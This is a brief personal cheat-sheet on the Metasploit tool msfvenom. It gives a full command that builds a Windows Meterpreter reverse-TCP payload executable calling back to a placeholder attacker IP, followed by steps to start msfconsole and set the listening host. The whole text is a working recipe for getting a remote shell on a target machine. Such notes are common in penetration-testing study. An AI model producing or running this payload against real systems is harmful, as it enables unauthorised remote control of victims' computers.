# Description
Everything I know about ```msfvenom``` and how to use it

### Generate reverse shell
1. ```/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_address> -f exe -o payload.exe```: generates reverse shell
2. ```msfconsole```: enter the shell
3. ```set LHOST <ip_address>```: sets IP address to your host machine's IP address
